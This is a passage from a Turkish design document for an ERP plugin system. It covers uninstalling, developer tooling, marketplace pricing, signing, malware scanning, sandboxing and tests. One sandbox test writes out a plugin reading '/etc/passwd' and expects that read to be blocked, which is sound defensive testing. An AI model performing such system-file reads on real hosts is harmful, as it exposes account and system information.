        EventBus::unsubscribe($plugin);
        
        // 2. Container durdur
        Docker::stopContainer($this->containerId($plugin, $tenant));
        
        // 3. Data silme (opsiyonel, onay gerekli)
        if ($deleteData) {
            $this->dropPluginTables($plugin, $tenant);
        } else {
            // Sadece "uninstalled" olarak işaretle
            DB::table('plugin_installation')
                ->where('plugin_id', $plugin->id)
                ->where('tenant_id', $tenant->id)
                ->update(['status' => 'uninstalled', 'uninstalled_at' => now()]);
        }
        
        // 4. Audit
        PluginAuditLog::create([
            'plugin_id' => $plugin->id,
            'tenant_id' => $tenant->id,
            'action' => 'uninstalled',
            'details' => ['delete_data' => $deleteData],
        ]);
    }
}
Kural: Default data korunur — kullanıcı "sildim" demeden veri gitmez.

10. Developer Experience
10.1. Development Environment
bash
# 1. SDK kur
composer require erp/plugin-sdk

# 2. Plugin oluştur
php artisan plugin:new wolt-integration

# 3. Geliştir
cd plugins/wolt-integration
# ... kod yaz ...

# 4. Test et (sandbox)
php artisan plugin:test wolt-integration

# 5. Marketplace'e gönder
php artisan plugin:publish wolt-integration
10.2. Local Sandbox
bash
php artisan plugin:dev wolt-integration --tenant=demo-tenant
Sonuç:

Local tenant'ta plugin aktif

Hot reload (kod değişince otomatik)

Debug loglar

Test dataları

10.3. CLI
Komut	Açıklama
plugin:new <key>	Yeni plugin iskeleti
plugin:dev <key>	Development mode
plugin:test <key>	Automated test
plugin:publish <key>	Marketplace'e gönder
plugin:logs <key>	Runtime logları
plugin:stats <key>	Kullanım istatistikleri
plugin:upgrade <key>	Yeni versiyon
10.4. Testing Framework
php
// tests/PluginTest.php
class WoltIntegrationTest extends PluginTestCase {
    public function test_order_sync(): void {
        // Arrange
        $order = $this->createSalesOrder();
        $this->mockHttpClient()->expect('POST', 'https://wolt.com/api/orders');
        
        // Act
        $this->plugin->onOrderCreated(new SalesOrderCreated($order));
        
        // Assert
        $this->assertHttpPostSent();
        $this->assertDatabaseHas('plugin_wolt_sync', ['order_id' => $order->id]);
    }
}
Özellikler:

Mock HTTP

Mock event

Sandbox içinde

SQLite in-memory

10 saniyede tüm testler

10.5. Developer Dashboard
text
┌────────────────────────────────────────────────────────────┐
│  Developer Dashboard — Ali Yılmaz                          │
├────────────────────────────────────────────────────────────┤
│  📦 Plugin'lerim                                           │
│  ────────────────────────────────────────────              │
│  Wolt Integration v1.2.0  │ Published │ 45 tenant          │
│  Trendyol Sync v0.5.0     │ Draft     │ —                  │
│  Menu Sync v1.0.0         │ Review    │ —                  │
│                                                            │
│  💰 Gelir (Bu Ay)                                          │
│  ────────────────────────────────────────────              │
│  Wolt: 45 × 500 TL = 22.500 TL                            │
│  Platform komisyon (%20): -4.500 TL                       │
│  Net gelir: 18.000 TL                                     │
│                                                            │
│  📊 Kullanım                                                │
│  ────────────────────────────────────────────              │
│  API çağrıları (24h): 12.345                              │
│  Event dinleme (24h): 890                                 │
│  Hata oranı: 0.02%                                        │
│  Ortalama yanıt: 45 ms                                    │
│                                                            │
│  💬 Müşteri Destek                                         │
│  ────────────────────────────────────────────              │
│  Açık ticket: 2                                            │
│  Yanıt süresi: 4 saat (hedef: 24 saat)                    │
│                                                            │
│  ⭐ Rating: 4.8 / 5.0 (45 review)                         │
└────────────────────────────────────────────────────────────┘
10.6. Dev Environment (Cloud)
Ücretsiz dev tenant:

1 developer hesabı başına

Sandbox data (gerçek değil)

Sınırsız test

Plugin deploy

Kural: Developer, gerçek tenant kurmadan test edebilir.

11. Marketplace Integration
11.1. Marketplace Kategorileri
Integration (Wolt, Trendyol, Stripe)

Compliance (e-Fatura, e-Defter)

Vertical (Restoran, Klinik, İnşaat)

Analytics (Rapor, BI)

Communication (Slack, WhatsApp)

Payment (Stripe, iyzico)

AI (OCR, chatbot)

Security (2FA, IP kısıtlama)

11.2. Pricing Models
Model	Örnek
Free	Basit plugin
Freemium	Temel ücretsiz, premium ücretli
One-time	500 TL tek seferlik
Monthly	500 TL/ay
Yearly	5000 TL/yıl
Usage-based	0.10 TL/API çağrısı
Tiered	Basic/Pro/Enterprise
11.3. Platform Komisyonu
Plugin Türü	Komisyon
Public (marketplace)	%20
Partner (verified)	%15
Private (tenant)	%0
Custom (self)	%0
11.4. Ödeme Akışı
text
1. Tenant ödeme yapar (Stripe/iyzico)
    ↓
2. Platform %20 komisyon alır
    ↓
3. %80 developer'a (aylık transfer)
    ↓
4. Fatura otomatik
11.5. Review & Rating
Tenant, plugin'i değerlendirebilir:

1-5 yıldız

Yorum + ekran görüntüsü

Verified purchase badge

Response (developer yanıtlar)

Kural: Sahte review → ban + developer penalty.

12. Security
12.1. Signature Verification
Her plugin imzalı olmalı:

php
class SignatureVerifier {
    public function verify(string $pluginPath, string $signature): bool {
        // 1. Dosyaları oku
        $files = $this->collectFiles($pluginPath);
        
        // 2. Hash hesapla
        $hash = hash('sha256', $this->concatFiles($files));
        
        // 3. Marketplace public key ile imza doğrula
        $publicKey = config('marketplace.public_key');
        return openssl_verify($hash, base64_decode($signature), $publicKey, OPENSSL_ALGO_SHA256) === 1;
    }
}
Kural: Signature invalid → plugin yüklenmez.

12.2. Malware Scan
Otomatik kontroller:

ClamAV

YARA rules

Backdoor pattern matching

Obfuscated code detection

12.3. Supply Chain
Dependency kontrolü:

Composer audit

Snyk / Dependabot

License uyumu (GPL → red)

12.4. Runtime Monitoring
Resource spike → alarm

Scope violation → alarm + auto suspend

Error rate spike → alarm

Unusual network → alarm + kill

12.5. Incident Response
text
1. Anomali tespit → alarm
    ↓
2. Auto-suspend (kritikse)
    ↓
3. Security team review
    ↓
4. Karar: resume / ban / fix
    ↓
5. Developer + tenant notification
    ↓
6. Post-mortem
13. Performance
13.1. Container Startup
Problem: Her plugin container startup = 500ms-2sn.

Çözüm:

Warm pool: Plugin container'ları önceden başlatılır

Lazy load: İlk kullanımda başlat

Reuse: İdle container 15 dk sonra kapanır

13.2. API Çağrı Overhead
Problem: Plugin → API çağrısı → container → platform = 50-200ms overhead.

Çözüm:

Shared memory (Redis pub/sub) — aynı host'ta

Batch API — aynı istekte birden fazla çağrı

Cache — sık veriler

13.3. Event Bus Performance
Ölçek	Event/sn	Strateji
Küçük	< 100	Tek Redis
Orta	100-1000	Redis cluster
Büyük	> 1000	RabbitMQ / Kafka
13.4. Resource Quotas
Plan bazlı:

Plan	CPU	RAM	API/dk
Free	0.25 core	128 MB	100
Pro	0.5 core	256 MB	1000
Enterprise	2 core	1 GB	10000
14. Test Stratejisi
14.1. Unit Test (Plugin içi)
php
public function test_wolt_payload_mapping(): void {
    $mapper = new WoltPayloadMapper();
    $order = SalesOrder::factory()->make(['total' => 150]);
    
    $payload = $mapper->toWolt($order);
    
    $this->assertEquals(150, $payload['total_amount']);
}
14.2. Integration Test (Platform + Plugin)
php
public function test_order_flows_to_wolt(): void {
    $this->mockHttpClient()->expect('POST', 'https://wolt.com/api/orders');
    
    $order = SalesOrder::factory()->create();
    event(new SalesOrderCreated($order));
    
    $this->assertHttpPostSent();
}
14.3. Sandbox Test
php
public function test_plugin_cannot_access_etc_passwd(): void {
    $this->expectException(SandboxViolationException::class);
    
    $this->plugin->run(fn() => file_get_contents('/etc/passwd'));
}
14.4. Security Test
php
public function test_plugin_cannot_bypass_scope(): void {
    $this->expectException(ScopeViolationException::class);
    
    // Plugin sadece "read" izniyle "create" çağırıyor
    $this->plugin->api()->post('/api/v1/otc/sales-orders', []);
}
14.5. Load Test
bash
k6 run --vus 100 --duration 5m plugin-loadtest.js
Hedef: 1000 API çağrısı/dk, P95 < 200ms.

15. Anti-Patterns
Bu projede yasak olan plugin hataları:

Sandbox'sız plugin — Container zorunlu

Scope'suz plugin — Manifest'te izin zorunlu

Signature'sız plugin — Güvenlik

Ana platforma müdahale — API/event üzerinden

Cross-tenant data — RLS + scope

Başka plugin'in verisi — İzolasyon

Sınırsız resource — CPU/RAM limit

Keyfi network — Whitelist

Raw SQL — Eloquent/API

Hardcoded secret — Ayarlar şifreli

Silent failure — Log + audit

Breaking change — Version bump

Public code leak (private) — Kod korunur

Owner bypass — Owner bile audit'lenir

Auto-update zorla — Tenant onayı

16. Roadmap
Aşama	Süre	Kapsam
1. Plugin manifest	2 hafta	Schema, validation, signature
2. Sandbox (process pool)	4 hafta	PHP-FPM pool + limitler
3. Permission system	3 hafta	Scope + onay + runtime check
4. Behavioral audit	3 hafta	Log + dashboard
5. Marketplace	6 hafta	Catalog, install, payment
6. Developer dashboard	4 hafta	Plugin management, gelir
7. Container sandbox	6 hafta	Docker + orchestration
8. WASM (opsiyonel)	8 hafta	php-wasm
Toplam: 36 hafta (~9 ay).

17. Glossary
Terim	Anlam
Plugin	3rd party kod paketi
Public Plugin	Marketplace'te satılan
Private Plugin	Sadece hedef tenant
Custom Module	Tenant self-service
Manifest	plugin.json
Sandbox	İzole çalışma ortamı
Container	Docker izolasyon
Process Pool	PHP-FPM pool izolasyon
WASM	WebAssembly izolasyon
Scope	Plugin izni
Signature	Güvenlik imzası
Behavioral Audit	Runtime log
Code Review	Kaynak kod inceleme
Kill Switch	Acil durdurma
Dependency	Plugin bağımlılığı
Version Pinning	Belirli versiyona sabitleme
Marketplace	Plugin satış platformu
18. Değişiklik Geçmişi
Tarih	Sürüm	Değişiklik
2026-11-06	1.0	İlk sürüm — plugin sistemi, sandbox, 3 seviyeli audit